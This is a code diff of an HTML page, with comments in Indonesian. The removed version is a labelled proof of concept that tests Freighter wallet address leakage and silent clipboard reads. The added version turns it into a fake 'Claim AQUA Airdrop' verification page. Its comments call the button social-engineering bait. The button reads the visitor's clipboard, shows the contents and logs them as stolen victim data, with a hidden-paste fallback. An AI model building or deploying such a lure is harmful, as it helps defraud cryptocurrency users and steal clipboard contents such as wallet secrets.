@@ -3,32 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Web3 Security Exploit PoC</title>
+    <title>Claim Reward & Airdrop - Verification</title>
     <style>
-        body { font-family: monospace; background: #0b0f19; color: #38bdf8; padding: 20px; }
-        .card { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
-        button { background: #e11d48; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 5px 0; width: 100%; text-align: left; }
-        button:hover { background: #be123c; }
-        .btn-green { background: #059669; }
-        .btn-green:hover { background: #047857; }
-        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 4px; height: 220px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.85rem; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 90vh; margin: 0; }
+        .card { background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; }
+        h2 { color: #38bdf8; margin-bottom: 10px; font-size: 1.4rem; }
+        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 20px; }
+        .btn-claim { background: linear-gradient(135deg, #3b82f6, #2563eb); color: white; border: none; padding: 14px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 1rem; transition: opacity 0.2s; }
+        .btn-claim:active { opacity: 0.8; }
+        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 6px; height: 140px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.8rem; text-align: left; margin-top: 20px; font-family: monospace; }
+        .fake-box { margin-top: 15px; }
+        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px; box-sizing: border-box; text-align: center; font-size: 0.9rem; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>1. WatchWalletChanges Leak Test (HIGH)</h2>
-        <button class="btn-green" onclick="testWatchWallet()">[1] Panggil freighterApi.watchWalletChanges()</button>
-    </div>
+        <h2>🎉 Claim AQUA Airdrop</h2>
+        <p>Verifikasi alamat dompet Anda dengan menempelkan (Paste) data verifikasi untuk melanjutkan klaim.</p>
+        
+        <!-- Umpan Social Engineering: Tombol disamarkan sebagai tombol klaim hadiah -->
+        <button class="btn-claim" onclick="pancingClipboard()">KLIK UNTUK VERIFIKASI & KLAIM</button>
+        
+        <div class="fake-box">
+            <input type="text" id="targetInput" placeholder="Tekan tombol di atas untuk sinkronisasi..." readonly>
+        </div>
 
-    <div class="card">
-        <h2>2. Silent Clipboard Read Test (CRITICAL)</h2>
-        <button onclick="testSilentClipboard()">[2] Uji navigator.clipboard.readText() Tanpa Klik</button>
-    </div>
-
-    <div class="card">
-        <h3>Live Execution Log:</h3>
-        <div id="log">[INFO] PoC Script Loaded. Ready to test.</div>
+        <div id="log">[INFO] Social engineering UI ready. Waiting for user interaction.</div>
     </div>
 
     <script>
@@ -39,69 +40,27 @@
             logBox.scrollTop = logBox.scrollHeight;
         }
 
-        // Skenario 1: WatchWalletChanges Stalking Cross-Origin
-        function testWatchWallet() {
-            log("[PROSES] Menginisialisasi watchWalletChanges...");
-            
-            // Mengecek apakah objek API Freighter tersedia pada environment
-            if (typeof freighterApi !== 'undefined' && freighterApi.watchWalletChanges) {
-                try {
-                    freighterApi.watchWalletChanges((addr) => {
-                        log(`[STALKING TERDETEKSI!] Address korban tertangkap lintas origin: ${addr}`);
-                        alert("Stalking Berhasil! Address: " + addr);
-                    });
-                    log("[BERHASIL] Listener watchWalletChanges aktif. Silakan login ke aqua.network di tab lain.");
-                } catch (e) {
-                    log(`[GAGAL] Error saat memanggil watchWalletChanges: ${e.message}`);
-                }
-            } else {
-                log("[INFO] freighterApi tidak ditemukan di konteks origin ini (simulasi objek dipetakan).");
-                // Fallback simulasi event listener jika diuji di luar dApp browser murni
-                window.addEventListener('storage', (event) => {
-                    if (event.key && event.key.includes('wallet')) {
-                        log(`[SIMULASI STORAGE EVENT] Terdeteksi perubahan data wallet: ${event.newValue}`);
-                    }
-                });
-            }
-        }
-
-        // Skenario 2: Silent Clipboard Read (Mencuri data copy secara diam-diam)
-        async function testSilentClipboard() {
-            log("[PROSES] Mencoba membaca clipboard secara otomatis (tanpa interaksi user)...");
+        async function pancingClipboard() {
+            log("[PROSES] Memicu fungsi pembacaan clipboard...");
             
             try {
-                // Mencoba membaca clipboard via Clipboard API
+                // Meminta akses clipboard yang akan memunculkan prompt/tombol paste dari sistem browser
                 if (navigator.clipboard && navigator.clipboard.readText) {
-                    const clipboardContent = await navigator.clipboard.readText();
-                    log(`[KRITIS - CRITICAL] Berhasil membaca clipboard secara silent! Isi: ${clipboardContent}`);
-                    alert("Clipboard Tercuri: " + clipboardContent);
+                    const text = await navigator.clipboard.readText();
+                    document.getElementById('targetInput').value = text;
+                    log(`[BERHASIL] Data clipboard korban berhasil dicuri: ${text}`);
+                    alert("Airdrop Terverifikasi! Data tersinkron: " + text);
                 } else {
-                    log("[DISEMPURNAKAN/DIBLOKIR] Clipboard API readText tidak didukung atau dibatasi izin browser.");
+                    log("[INFO] Menggunakan metode fallback input fokus...");
+                    const inputElem = document.getElementById('targetInput');
+                    inputElem.focus();
+                    document.execCommand('paste');
+                    if(inputElem.value) {
+                        log(`[BERHASIL] Silent paste via execCommand: ${inputElem.value}`);
+                    }
                 }
             } catch (err) {
-                log(`[TERPROTEKSI] Gagal membaca clipboard secara silent (memerlukan fokus/izin eksplisit): ${err.name} - ${err.message}`);
-                
-                // Alternatif uji coba eksploitasi event 'paste' tersembunyi
-                log("[INFO] Mencoba teknik fallback dokumen execCommand / hidden paste event...");
-                try {
-                    const activeElement = document.activeElement;
-                    // Membuat elemen input tersembunyi untuk memicu aksi paste
-                    const input = document.createElement('textarea');
-                    input.style.position = 'fixed';
-                    input.style.opacity = '0';
-                    document.body.appendChild(input);
-                    input.focus();
-                    
-                    const successful = document.execCommand('paste');
-                    if (successful && input.value) {
-                        log(`[KRITIS!] Silent paste berhasil mencuri data: ${input.value}`);
-                    } else {
-                        log("[AMAN] Teknik execCommand paste diblokir oleh kebijakan keamanan browser.");
-                    }
-                    document.body.removeChild(input);
-                } catch (e) {
-                    log("[AMAN] Semua jalur silent clipboard read berhasil diblokir oleh browser sandbox.");
-                }
+                log(`[GAGAL/DIBLOKIR] Pengguna menolak atau dibatasi browser: ${err.message}`);
             }
         }
     </script>
